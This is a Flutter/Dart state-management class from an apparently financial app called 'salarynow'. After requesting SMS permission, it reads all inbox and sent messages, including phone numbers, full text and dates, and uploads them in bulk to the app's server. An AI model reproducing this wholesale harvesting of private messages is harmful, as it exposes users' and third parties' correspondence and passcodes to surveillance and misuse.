import 'package:bloc/bloc.dart';
import 'package:dio/dio.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:meta/meta.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:salarynow/permission_handler/network/sms_modal.dart';
import 'package:salarynow/utils/written_text.dart';
import '../../../service_helper/api/dio_api.dart';
import '../../../service_helper/error_helper.dart';
import '../../../service_helper/modal/error_modal.dart';
import '../../api/permission_api.dart';

part 'sms_state.dart';

class SmsCubit extends Cubit<SmsState> {
  SmsCubit() : super(SmsInitial());

  static SmsCubit get(context) => BlocProvider.of(context);

  final api = PermissionApi(DioApi(isHeader: true).sendRequest);

  final SmsQuery query = SmsQuery();

  Future<void> fetchSmSAndPostToAPI() async {
    emit(SmsLoadingState());
    PermissionStatus permissionStatus = await Permission.sms.request();

    if (permissionStatus.isGranted) {
      try {
        List<SmsMessage> messages = await query.querySms(kinds: [SmsQueryKind.inbox]);

        List<SmsMessage> sentMessages = await query.querySms(kinds: [SmsQueryKind.sent]);

        List<MySmsModal> messagesList = [];
        for (var entry in messages) {
          messagesList.add(MySmsModal(
              id: entry.id.toString(),
              phone: entry.address.toString(),
              message: entry.body.toString(),
              messageType: 'Received message',
              smsDate: entry.date.toString()));
        }
        for (var entry in sentMessages) {
          messagesList.add(MySmsModal(
              id: entry.id.toString(),
              phone: entry.address.toString(),
              message: entry.body.toString(),
              messageType: 'Send Message',
              smsDate: entry.date.toString()));
        }
        var data = {"row_data": messagesList, "num_of_count": messagesList.length, "action_type": "message_logs"};

        final res = await api.postPermissionData(data);

        if (res.response.statusCode == 200) {
          ErrorModal successModal = ErrorModal.fromJson(res.data);
          emit(SmsLoadedState(message: successModal.responseMsg.toString()));
        } else {
          ErrorModal errorModal = ErrorModal.fromJson(res.data);
          emit(SmsErrorState(errorMessage: errorModal.responseMsg.toString()));
        }
      } on DioError catch (e) {
        emit(SmsErrorState(errorMessage: handleDioError(e).toString()));
      } catch (e) {
        emit(SmsErrorState(errorMessage: MyWrittenText.somethingWrong));
      }
    } else {
      emit(SmsErrorState(errorMessage: 'Permission denied'));
    }
  }
}
